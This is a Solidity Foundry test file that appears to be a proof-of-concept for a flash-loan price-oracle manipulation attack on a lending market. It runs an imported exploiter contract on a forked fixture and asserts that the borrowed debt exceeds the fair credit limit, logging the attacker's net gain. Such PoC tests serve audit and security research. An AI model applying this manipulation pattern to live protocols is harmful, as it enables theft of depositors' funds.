// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "../src/interfaces/IERC20.sol";
import {FlashPumpExploiter} from "../src/OracleAttackReceiver.sol";
import {VulnerableForkFixture} from "./BaseFork.t.sol";

contract SpotOracleExploitProofTest is VulnerableForkFixture {
    uint256 internal constant FLASH_PRINCIPAL = 2_000_000e6;
    uint256 internal constant REFERENCE_COLLATERAL = 500e18;
    uint256 internal constant UNMANIPULATED_MAX_CREDIT = 800_000e6;

    FlashPumpExploiter internal exploiter;

    function setUp() public override {
        super.setUp();
        exploiter = _createExploiter();
        vm.label(address(exploiter), "flash-pump-exploiter");

        _supplyWeth(borrowerAlice, REFERENCE_COLLATERAL);
    }

    function test_flashLoanSpotOracleManipulation() public {
        uint256 initialQuote = spotFeed.readPrice();
        uint256 legitimateCreditLimit = creditMarket.availableCredit(borrowerAlice);

        assertLt(legitimateCreditLimit, FLASH_PRINCIPAL, "flash principal must exceed fair borrowing capacity");
        assertEq(initialQuote, 2_000e18, "unexpected initial quote");
        assertEq(legitimateCreditLimit, UNMANIPULATED_MAX_CREDIT, "unexpected baseline credit");

        exploiter.executeExploit(FLASH_PRINCIPAL);

        uint256 distortedQuote = spotFeed.readPrice();
        uint256 extractedDebt = exploiter.drawnAgainstCollateral();
        uint256 netAttackerGain = IERC20(MAINNET_USDC).balanceOf(exploiterOwner);

        console2.log("4. distorted spot quote after swap", distortedQuote);
        console2.log("5. USDC borrowed at distorted quote", extractedDebt);
        console2.log("6. net attacker gain after flash fee", netAttackerGain);

        assertGt(extractedDebt, legitimateCreditLimit, "failed to exceed fair credit limit");
        assertEq(extractedDebt, creditMarket.borrowedDebt(address(exploiter)), "debt ledger mismatch");
    }

    
}
